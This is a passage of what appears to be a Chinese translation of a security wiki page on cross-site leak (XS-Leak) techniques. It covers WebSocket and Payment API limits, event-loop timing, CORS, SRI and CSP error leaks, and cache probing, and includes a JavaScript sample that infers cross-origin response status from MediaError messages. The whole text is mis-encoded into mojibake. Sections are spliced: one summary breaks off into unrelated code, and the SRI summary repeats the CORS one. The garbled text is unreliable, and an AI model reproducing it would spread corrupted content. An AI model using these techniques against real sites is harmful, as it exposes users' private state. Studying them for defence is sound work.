å¦‚æœç¬¬ä¸€ä¸ª URL **æˆåŠŸåŠ è½½**ï¼Œé‚£ä¹ˆï¼Œåœ¨**æ›´æ”¹** URL çš„**å“ˆå¸Œ**éƒ¨åˆ†æ—¶ï¼Œ**onload** äº‹ä»¶**ä¸ä¼šå†æ¬¡è§¦å‘**ã€‚ä½†**å¦‚æœ**é¡µé¢åœ¨**åŠ è½½**æ—¶å‡ºç°æŸç§**é”™è¯¯**ï¼Œé‚£ä¹ˆï¼Œ**onload** äº‹ä»¶å°†**å†æ¬¡è§¦å‘**ã€‚

ç„¶åï¼Œä½ å¯ä»¥**åŒºåˆ†**é¡µé¢æ˜¯**æ­£ç¡®**åŠ è½½è¿˜æ˜¯åœ¨è®¿é—®æ—¶å‡ºç°**é”™è¯¯**ã€‚

### Javascript æ‰§è¡Œ

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ¦‚è¦**ï¼šå¦‚æœ**é¡µé¢**æ­£åœ¨**è¿”å›** **æ•æ„Ÿ**å†…å®¹ï¼Œ**æˆ–è€…**å¯ä»¥ç”±ç”¨æˆ·**æ§åˆ¶**çš„**å†…å®¹**ã€‚ç”¨æˆ·å¯ä»¥åœ¨è´Ÿé¢æƒ…å†µä¸‹è®¾ç½®**æœ‰æ•ˆçš„ JS ä»£ç **ï¼Œå¹¶åœ¨ **`<script>`** æ ‡ç­¾å†…åŠ è½½æ¯æ¬¡å°è¯•ï¼Œå› æ­¤åœ¨**è´Ÿé¢**æƒ…å†µä¸‹æ”»å‡»è€…**ä»£ç **è¢«**æ‰§è¡Œ**ï¼Œåœ¨**è‚¯å®š**æƒ…å†µä¸‹**ä»€ä¹ˆéƒ½ä¸ä¼šæ‰§è¡Œ**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç å’Œå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **æ¦‚è¦**ï¼šæ”»å‡»è€…å¯ä»¥è§‚å¯Ÿåˆ°å½“å“åº”è¿”å›å— _CORB ä¿æŠ¤_ çš„ `Content-Type`ï¼ˆå’Œ `nosniff`ï¼‰ä»¥åŠçŠ¶æ€ç  `2xx` æ—¶ï¼ŒCORB ä¼šä»å“åº”ä¸­å‰¥ç¦»æ­£æ–‡å’Œå¤´éƒ¨ã€‚æ£€æµ‹åˆ°è¿™ç§ä¿æŠ¤å…è®¸æ”»å‡»è€…**æ³„éœ²**ä¸¤è€…çš„ç»„åˆï¼š**çŠ¶æ€ç **ï¼ˆæˆåŠŸä¸å¦ï¼‰å’Œ**`Content-Type`ï¼ˆæ˜¯å¦å— CORB ä¿æŠ¤ï¼‰ã€‚**
* **ä»£ç ç¤ºä¾‹**ï¼š

æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### onblur

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **æ¦‚è¦**ï¼šä» id æˆ– name å±æ€§æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

å¯ä»¥**åŠ è½½ä¸€ä¸ªé¡µé¢**åˆ°**iframe**ä¸­ï¼Œå¹¶ä½¿ç”¨ **`#id_value`** ä½¿é¡µé¢**èšç„¦**åˆ°å¸¦æœ‰æŒ‡å®š id çš„ iframe å…ƒç´ ä¸Šï¼Œç„¶åå¦‚æœè§¦å‘äº† **`onblur`** ä¿¡å·ï¼ŒID å…ƒç´ å­˜åœ¨ã€‚\
ä½ å¯ä»¥ä½¿ç”¨ **`portal`** æ ‡ç­¾æ‰§è¡Œç›¸åŒçš„æ”»å‡»ã€‚

### postMessage å¹¿æ’­ <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPI ä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **æ¦‚è¦**ï¼šä» postMessage æ”¶é›†æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–ä½¿ç”¨ postMessages çš„å­˜åœ¨ä½œä¸ºç”²éª¨æ–‡æ¥äº†è§£ç”¨æˆ·åœ¨é¡µé¢ä¸­çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**ï¼š`ç›‘å¬æ‰€æœ‰ postMessages çš„ä»»ä½•ä»£ç ã€‚`

åº”ç”¨ç¨‹åºç»å¸¸ä½¿ç”¨ [postMessage å¹¿æ’­](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) æ¥ä¸å…¶ä»–æ¥æºå…±äº«ä¿¡æ¯ã€‚ç›‘å¬è¿™äº›æ¶ˆæ¯ï¼Œå¯ä»¥æ‰¾åˆ°**æ•æ„Ÿä¿¡æ¯**ï¼ˆå¦‚æœæ²¡æœ‰ä½¿ç”¨ `targetOrigin` å‚æ•°çš„è¯ï¼‰ã€‚æ­¤å¤–ï¼Œæ¥æ”¶åˆ°æŸäº›æ¶ˆæ¯çš„äº‹å®å¯ä»¥**ç”¨ä½œç”²éª¨æ–‡**ï¼ˆå¦‚æœä½ ç™»å½•äº†ï¼Œä½ æ‰ä¼šæ”¶åˆ°è¿™ç§æ¶ˆæ¯ï¼‰ã€‚

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å…¨å±€é™åˆ¶æŠ€æœ¯

### WebSocket API

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPI ä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ¦‚è¦**ï¼šè€—å°½ WebSocket è¿æ¥é™åˆ¶æ³„éœ²è·¨æºé¡µé¢çš„ WebSocket è¿æ¥æ•°é‡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

å¯ä»¥è¯†åˆ«ç›®æ ‡é¡µé¢ä½¿ç”¨äº†å¤šå°‘ä¸ª**WebSocket è¿æ¥**ã€‚å®ƒå…è®¸æ”»å‡»è€…æ£€æµ‹åº”ç”¨ç¨‹åºçŠ¶æ€å¹¶æ³„éœ²ä¸ WebSocket è¿æ¥æ•°é‡ç›¸å…³çš„ä¿¡æ¯ã€‚

å¦‚æœä¸€ä¸ª**æ¥æº**ä½¿ç”¨äº†**æœ€å¤§æ•°é‡çš„ WebSocket** è¿æ¥å¯¹è±¡ï¼Œæ— è®ºå®ƒä»¬çš„è¿æ¥çŠ¶æ€å¦‚ä½•ï¼Œ**åˆ›å»ºæ–°å¯¹è±¡å°†å¯¼è‡´ JavaScript å¼‚å¸¸**ã€‚è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ”»å‡»è€…ç½‘ç«™åœ¨å¼¹å‡ºçª—å£æˆ– iframe ä¸­æ‰“å¼€ç›®æ ‡ç½‘ç«™ï¼Œç„¶åï¼Œåœ¨ç›®æ ‡ç½‘é¡µåŠ è½½åï¼Œå°è¯•åˆ›å»ºå°½å¯èƒ½å¤šçš„ WebSocket è¿æ¥ã€‚**æŠ›å‡ºçš„å¼‚å¸¸æ•°é‡**æ˜¯**ç›®æ ‡ç½‘ç«™çª—å£ä½¿ç”¨çš„ WebSocket è¿æ¥æ•°é‡**ã€‚

### Payment API

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPI ä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ¦‚è¦**ï¼šæ£€æµ‹ Payment Requestï¼Œå› ä¸ºä¸€æ¬¡åªèƒ½æ¿€æ´»ä¸€ä¸ªã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

è¿™ä¸ª XS-Leak ä½¿æ”»å‡»è€…èƒ½å¤Ÿ**æ£€æµ‹è·¨æºé¡µé¢ä½•æ—¶å¯åŠ¨æ”¯ä»˜è¯·æ±‚**ã€‚

å› ä¸º**ä¸€æ¬¡åªèƒ½æ¿€æ´»ä¸€ä¸ªè¯·æ±‚æ”¯ä»˜**ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™æ­£åœ¨ä½¿ç”¨ Payment Request APIï¼Œä»»ä½•**è¿›ä¸€æ­¥å°è¯•æ˜¾ç¤ºæ­¤ API å°†å¤±è´¥**ï¼Œå¹¶å¯¼è‡´**JavaScript å¼‚å¸¸**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡**å®šæœŸå°è¯•æ˜¾ç¤º Payment API UI** æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœä¸€æ¬¡å°è¯•å¯¼è‡´å¼‚å¸¸ï¼Œåˆ™ç›®æ ‡ç½‘ç«™å½“å‰æ­£åœ¨ä½¿ç”¨å®ƒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨åˆ›å»ºåç«‹å³å…³é—­ UI æ¥éšè—è¿™äº›å®šæœŸå°è¯•ã€‚

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **åŒ…å«æ–¹æ³•**ï¼š
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **æ¦‚è¦**ï¼šé€šè¿‡æ»¥ç”¨å•çº¿ç¨‹ JS äº‹ä»¶å¾ªç¯æµ‹é‡ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript çš„å¹¶å‘æ¨¡å‹åŸºäº[å•çº¿ç¨‹äº‹ä»¶å¾ªç¯](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)ï¼Œè¿™æ„å‘³ç€**å®ƒä¸€æ¬¡åªèƒ½è¿è¡Œä¸€ä¸ªä»»åŠ¡**ã€‚\
é€šè¿‡æµ‹é‡**ä¸‹ä¸€ä¸ªäº‹ä»¶æ± ä¸­çš„ä»»åŠ¡è¿è¡Œéœ€è¦å¤šé•¿æ—¶é—´**æ¥æ¨æ–­**ä¸åŒæ¥æºçš„ä»£ç è¿è¡Œæ—¶é—´**ã€‚æ”»å‡»è€…ä¸æ–­å‘äº‹ä»¶å¾ªç¯å‘é€å…·æœ‰å›ºå®šå±æ€§çš„äº‹ä»¶ï¼Œè¿™äº›äº‹ä»¶æœ€ç»ˆä¼šè¢«åˆ†å‘ï¼Œå¦‚æœæ± ä¸ºç©ºçš„è¯ã€‚å…¶ä»–æ¥æºå‘åŒä¸€ä¸ªæ± åˆ†å‘äº‹ä»¶ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…**é€šè¿‡æ£€æµ‹å…¶ä»»åŠ¡æ˜¯å¦å»¶è¿Ÿæ¥æ¨æ–­æ—¶é—´å·®å¼‚**çš„åœ°æ–¹ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´æ”»å‡»ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **åŒ…å«æ–¹æ³•**ï¼š
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **æ¦‚è¦**ï¼šé€šè¿‡é”å®šçº¿ç¨‹çš„äº‹ä»¶å¾ªç¯å¹¶è®¡æ—¶**äº‹ä»¶å¾ªç¯å†æ¬¡å¯ç”¨éœ€è¦å¤šé•¿æ—¶é—´**æ¥æµ‹é‡ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

è¿™ç§æŠ€æœ¯çš„ä¸»è¦ä¼˜åŠ¿ä¹‹ä¸€æ˜¯å®ƒèƒ½å¤Ÿç»•è¿‡ç«™ç‚¹éš”ç¦»ï¼Œå› ä¸ºæ”»å‡»è€…æ¥æºå¯ä»¥å½±å“å¦ä¸€ä¸ªæ¥æºçš„æ‰§è¡Œã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´æ”»å‡»ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Connection Pool

* **åŒ…å«æ–¹æ³•**ï¼šJavaScript è¯·æ±‚
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **æ¦‚è¦**ï¼šæ”»å‡»è€…å¯ä»¥é”å®š
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
```markdown
**`MediaError`** æ¥å£çš„ message å±æ€§å¯¹äºæˆåŠŸåŠ è½½çš„èµ„æºåŒ…å«**ä¸åŒçš„å­—ç¬¦ä¸²**ã€‚è¿™å…è®¸æ”»å‡»è€…æ¨æ–­è·¨åŸŸèµ„æºçš„å“åº”çŠ¶æ€ã€‚

### CORS é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ¦‚è¦**ï¼šåœ¨ SA ä¸­ï¼ŒCORS é”™è¯¯ä¿¡æ¯æ³„éœ²äº†é‡å®šå‘çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

æ­¤æŠ€æœ¯å…è®¸æ”»å‡»è€…æ³„éœ²ç”±è·¨åŸŸç«™ç‚¹å‘èµ·çš„é‡å®šå‘ç›®æ ‡ã€‚

CORS å…è®¸ä»»ä½•ç½‘ç«™è¯»å–å’Œä½¿ç”¨å…¬å¼€å¯è®¿é—®çš„ç½‘ç»œèµ„æºã€‚åœ¨åŸºäº Webkit çš„æµè§ˆå™¨ä¸­ï¼Œå½“ CORS è¯·æ±‚å¤±è´¥æ—¶ï¼Œå¯ä»¥**è®¿é—® CORS é”™è¯¯ä¿¡æ¯**ã€‚æ”»å‡»è€…å¯ä»¥å‘ç›®æ ‡ç½‘ç«™å‘é€å¯ç”¨äº† CORS çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚åŸºäºç”¨æˆ·çŠ¶æ€è¿›è¡Œ**é‡å®šå‘**ã€‚å½“æµè§ˆå™¨æ‹’ç»è¯·æ±‚æ—¶ï¼Œ**é‡å®šå‘ç›®æ ‡çš„å®Œæ•´ URL ä¼šåœ¨é”™è¯¯ä¿¡æ¯ä¸­æ³„éœ²**ã€‚é€šè¿‡è¿™ç§æ”»å‡»ï¼Œå¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œæ³„éœ²é‡å®šå‘ä½ç½®å’Œæ•æ„ŸæŸ¥è¯¢å‚æ•°ã€‚

### SRI é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **æ¦‚è¦**ï¼šåœ¨ SA ä¸­ï¼ŒCORS é”™è¯¯ä¿¡æ¯æ³„éœ²äº†é‡å®šå‘çš„å®Œæ•´ URLã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

æ”»å‡»è€…å¯ä»¥ç”±äº**è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯**æ³„éœ²è·¨åŸŸå“åº”çš„å¤§å°ã€‚

integrity å±æ€§å®šä¹‰äº†æµè§ˆå™¨å¯ä»¥é€šè¿‡å…¶éªŒè¯è·å–çš„èµ„æºæœªè¢«ç¯¡æ”¹çš„åŠ å¯†å“ˆå¸Œã€‚è¿™ç§å®‰å…¨æœºåˆ¶ç§°ä¸ºå­èµ„æºå®Œæ•´æ€§ï¼ˆSRIï¼‰ã€‚å®ƒç”¨äºéªŒè¯ä»å†…å®¹äº¤ä»˜ç½‘ç»œï¼ˆCDNsï¼‰æä¾›çš„èµ„æºçš„å®Œæ•´æ€§ã€‚ä¸ºäº†é˜²æ­¢æ•°æ®æ³„éœ²ï¼Œè·¨åŸŸèµ„æºå¿…é¡»**å¯ç”¨ CORS**ã€‚å¦åˆ™ï¼Œå“åº”ä¸ç¬¦åˆå®Œæ•´æ€§éªŒè¯ã€‚ä¸ CORS é”™è¯¯ XS-Leak ç±»ä¼¼ï¼Œå¯ä»¥åœ¨å¸¦æœ‰ integrity å±æ€§çš„ fetch è¯·æ±‚å¤±è´¥åæ•è·**é”™è¯¯ä¿¡æ¯**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®š**ä¼ªé€ çš„å“ˆå¸Œå€¼**å¼ºåˆ¶**è§¦å‘**æ­¤**é”™è¯¯**ã€‚åœ¨ SA ä¸­ï¼Œæ­¤é”™è¯¯ä¿¡æ¯æ³„éœ²äº†è¯·æ±‚èµ„æºçš„å†…å®¹é•¿åº¦ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ³„éœ²æ¥æ£€æµ‹å“åº”å¤§å°çš„å·®å¼‚ï¼Œä»è€Œå®ç°å¼ºå¤§çš„ XS-Leak æ”»å‡»ã€‚

### CSP è¿è§„/æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **æ¦‚è¦**ï¼šå¦‚æœæˆ‘ä»¬è®¿é—®çš„å—å®³è€…ç½‘ç«™çš„ CSP ä»…å…è®¸è¯¥ç½‘ç«™ï¼Œå°è¯•é‡å®šå‘åˆ°ä¸åŒåŸŸåæ—¶ï¼ŒCSP å°†è§¦å‘å¯æ£€æµ‹çš„é”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak å¯ä»¥ä½¿ç”¨ CSP æ¥æ£€æµ‹æ˜¯å¦æœ‰è·¨åŸŸç«™ç‚¹è¢«é‡å®šå‘åˆ°ä¸åŒçš„æºã€‚è¿™ç§æ³„éœ²å¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œæ­¤å¤–ï¼Œé‡å®šå‘ç›®æ ‡çš„åŸŸåä¹Ÿä¼šæ³„éœ²ã€‚è¿™ç§æ”»å‡»çš„åŸºæœ¬æ€æƒ³æ˜¯**å…è®¸ç›®æ ‡åŸŸååœ¨æ”»å‡»è€…ç«™ç‚¹ä¸Š**ã€‚ä¸€æ—¦å‘ç›®æ ‡åŸŸåå‘å‡ºè¯·æ±‚ï¼Œå®ƒ**é‡å®šå‘**åˆ°è·¨åŸŸåŸŸåã€‚**CSP é˜»æ­¢**è®¿é—®å®ƒï¼Œå¹¶åˆ›å»º**è¿è§„æŠ¥å‘Šç”¨ä½œæ³„éœ²æŠ€æœ¯**ã€‚æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œ**æ­¤æŠ¥å‘Šå¯èƒ½æ³„éœ²é‡å®šå‘çš„ç›®æ ‡ä½ç½®**ã€‚\
ç°ä»£æµè§ˆå™¨ä¸ä¼šæ˜¾ç¤ºé‡å®šå‘åˆ°çš„ URLï¼Œä½†ä½ ä»ç„¶å¯ä»¥æ£€æµ‹åˆ°è§¦å‘äº†è·¨åŸŸé‡å®šå‘ã€‚

### ç¼“å­˜

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **æ¦‚è¦**ï¼šä»ç¼“å­˜ä¸­æ¸…é™¤æ–‡ä»¶ã€‚æ‰“å¼€ç›®æ ‡é¡µé¢æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨äºç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æµè§ˆå™¨å¯èƒ½ä¼šä¸ºæ‰€æœ‰ç½‘ç«™ä½¿ç”¨ä¸€ä¸ªå…±äº«ç¼“å­˜ã€‚ä¸ç®¡å®ƒä»¬çš„æ¥æºå¦‚ä½•ï¼Œéƒ½å¯ä»¥æ¨æ–­ç›®æ ‡é¡µé¢æ˜¯å¦**è¯·æ±‚äº†ç‰¹å®šæ–‡ä»¶**ã€‚

å¦‚æœé¡µé¢ä»…åœ¨ç”¨æˆ·ç™»å½•æ—¶åŠ è½½å›¾åƒï¼Œåˆ™å¯ä»¥**ä½¿èµ„æºæ— æ•ˆ**ï¼ˆå¦‚æœå®ƒå·²ç»è¢«ç¼“å­˜ï¼Œåˆ™ä¸å†ç¼“å­˜ï¼Œå‚è§æ›´å¤šä¿¡æ¯é“¾æ¥ï¼‰ï¼Œ**æ‰§è¡Œå¯èƒ½åŠ è½½è¯¥èµ„æºçš„è¯·æ±‚**ï¼Œå¹¶å°è¯•**ä½¿ç”¨é”™è¯¯è¯·æ±‚åŠ è½½èµ„æº**ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è¿‡é•¿çš„ referer å¤´ï¼‰ã€‚å¦‚æœèµ„æºåŠ è½½**æ²¡æœ‰è§¦å‘ä»»ä½•é”™è¯¯**ï¼Œé‚£æ˜¯å› ä¸ºå®ƒæ˜¯**ç¼“å­˜çš„**ã€‚

### CSP æŒ‡ä»¤

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **æ¦‚è¦**ï¼šå¯ä»¥é€šè¿‡ CSP iframe å±æ€§æ¢æµ‹ CSP å¤´éƒ¨æŒ‡ä»¤ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

GC ä¸­çš„ä¸€ä¸ªæ–°åŠŸèƒ½å…è®¸ç½‘é¡µé€šè¿‡åœ¨ iframe å…ƒç´ ä¸Šè®¾ç½®å±æ€§æ¥æå‡º CSPã€‚ç­–ç•¥æŒ‡ä»¤éš HTTP è¯·æ±‚ä¸€èµ·ä¼ è¾“ã€‚é€šå¸¸ï¼ŒåµŒå…¥å†…å®¹å¿…é¡»é€šè¿‡ HTTP å¤´éƒ¨æ˜ç¡®å…è®¸è¿™ä¸€ç‚¹ï¼Œ**å¦åˆ™ä¼šæ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚ç„¶è€Œï¼Œå¦‚æœ iframe å·²ç»é™„å¸¦äº† CSP å¹¶ä¸”æ–°ç­–ç•¥ä¸æ›´ä¸¥æ ¼ï¼Œåˆ™é¡µé¢å°†æ­£å¸¸æ˜¾ç¤ºã€‚

